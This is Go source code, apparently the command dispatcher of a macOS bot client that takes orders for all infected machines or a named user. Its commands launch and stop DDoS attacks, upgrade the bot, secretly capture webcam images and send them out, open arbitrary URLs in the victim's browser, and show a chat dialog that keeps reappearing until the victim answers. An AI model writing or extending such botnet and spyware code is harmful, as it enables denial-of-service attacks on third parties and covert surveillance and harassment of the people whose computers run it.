package main
import "github.com/everdev/mack"

func Execute(command string, target string, args string) {
	if target == "*" || target == GetUsername() {
		switch command {
		case "ddos":
			DdosApi(100, args)
		case "sdd":
			StopDdos()
		case "upgrade":
			Upgrade(args)
		case "say":
			mack.Say(args)
		case "notify":
			//Shows side notification (as script editor)
			mack.Notify("Complete")
    case "web":
      Web(args)
  	case "ask":
  		Ask(args, "null")
  	case "beep":
  		mack.Beep(3)
  	case "alert":
  		mack.Alert(args)

    case "cam":
      Send("img", Base64EncodeByte(GetPic()))
		default:
			Send("res", "Not a command")
		}
	}
}



func Ask(args string, hint string) {
  var response mack.Response
  if hint == "null" {
    response, _ = mack.Dialog(args, "Chat")
  } else {
    response, _ = mack.Dialog(args, "Chat", "hintText")
  }

  if response.Clicked == "Cancel" {
    Ask(args, hint)
  } else {
    Send("ask", GetUsername() + ": "+response.Text)
  }
} 

func Web(args string) {
  browsers := []string{"Google Chrome", "Firefox", "Safari"}
    for _, browser := range browsers {
      err := mack.Tell(browser, `open location ` + args)
      if err != nil {
          // handle error
      } else {
          break
      }
    }
  
}




